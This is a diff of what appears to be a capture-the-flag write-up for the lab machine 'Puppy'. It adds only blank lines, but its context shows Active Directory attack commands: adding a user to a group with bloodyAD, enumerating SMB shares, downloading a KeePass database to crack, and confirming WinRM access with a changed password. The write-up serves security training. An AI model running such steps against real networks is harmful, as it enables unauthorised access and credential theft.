@@ -210,6 +210,7 @@ smb: \>
 └─$ bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
 [+] levi.james added to DEVELOPERS
 ```
+
 ```bash
 └─$ smbmap -H 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!'           
 
@@ -238,6 +239,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
         SYSVOL                                                  READ ONLY       Logon server share 
 [*] Closed 1 connections
 ```
+
 &rarr; Can access the `DEV` share and read it.
 
 ## Initial Access
@@ -246,6 +248,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 smb: \> get recovery.kdbx 
 getting file \recovery.kdbx of size 2677 as recovery.kdbx (3.8 KiloBytes/sec) (average 3.8 KiloBytes/sec)
 ```
+
 &rarr; We can download the `recovery.kdbx` file and try to crack it.
 
 ```bash
@@ -419,6 +422,7 @@ HTTP        10.10.11.70     5985   10.10.11.70      [*] http://10.10.11.70:5985/
   arc4 = algorithms.ARC4(self._key)
 WINRM       10.10.11.70     5985   10.10.11.70      [+] PUPPY.HTB\ADAM.SILVER:P@ssw4rd123 (Pwn3d!)
 ```
+
 &rarr; Confirm that we can change the password of `ADAM.SILVER` user and success `Pwn3d!`.
 
 ```
